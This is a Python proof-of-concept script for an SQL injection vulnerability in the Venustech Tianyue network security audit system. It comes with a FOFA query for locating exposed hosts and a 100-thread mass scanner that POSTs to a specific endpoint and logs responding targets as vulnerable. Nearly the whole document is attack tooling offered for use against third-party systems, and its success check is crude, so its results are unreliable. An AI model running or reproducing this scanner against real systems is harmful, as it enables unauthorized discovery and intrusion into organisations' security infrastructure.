# 启明星辰天玥网络安全审计系统SQL注入漏洞/zh-cn

#fofa语法：app="启明星辰-天玥网络安全审计"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 

  _   _                              
 | | (_)                             
 | |_ _  __ _ _ __  _   _ _   _  ___ 
 | __| |/ _` | '_ \| | | | | | |/ _ \
 | |_| | (_| | | | | |_| | |_| |  __/
  \__|_|\__,_|_| |_|\__, |\__,_|\___|
                     __/ |           
                    |___/            
                                                                                                                                            
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="启明星辰-天玥网络安全审计")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/ops/index.php?c=Reportguide&a=checkrn'
    url = target + url_payload
    header = {
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'sec-ch-ua': '"Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cookie': '****',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '25'
    }
    data = "checkname=123&tagid=123"
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200 and "code" in res.text:
            print(f"f[+]该url存在SQL注入漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在SQL注入漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()